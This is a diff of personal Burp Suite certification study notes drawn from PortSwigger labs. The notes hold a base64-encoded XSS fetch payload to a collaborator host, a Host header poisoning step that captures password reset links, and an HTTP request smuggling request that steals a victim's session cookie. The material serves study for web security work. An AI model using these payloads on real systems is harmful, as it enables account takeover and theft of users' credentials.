@@ -1,6 +1,6 @@
 
 # Burp-Suite-Certified-Practitioner-Exam-Study
-PortSwigger Academy - Burp Suite Certified Practitioner Exam Study Notes
+My personal study notes on the PortSwigger Academy Burp Suite Certified Practitioner Exam topics.  
 
 [Cross Site Scripting](#cross-site-scripting)  
 [Host Header Poison - forgot-password](#host-header-poison---forgot-password)   
@@ -58,7 +58,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 [onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
-[Methodology to identify allowed tags and events (PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
+[Methodology to identify allowed tags and events - PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
 
 #### URL and Base64 online encoders and decoders  
 [URL Decode and Encode](https://www.urldecoder.org/)  
@@ -110,4 +110,34 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 <sup>Check the exploit server log to obtain the reset link to the victim username.</sup>
   
 ![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  
+
+
+## HTTP Request Smuggling
+
+### Bypass security controls capture victim requests
+>Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding(HEX) or content-length(Decimal).  Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.
+  
+<sub>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **hexadecimal**, and _ _Content-Length_ _ specifies the length of the message body in **bytes**. Chunk consists are followed by a **newline**, followed by the chunk contents. The message is terminated with a chunk of size zero.</sub>  
+
+```html
+POST / HTTP/1.1
+Host: TARGET.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 860
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
+>View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.
+  
+![Exploiting HTTP request smuggling to capture other users' requests](request-smuggling-cookie-stealer.PNG)  
+
+[PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
 
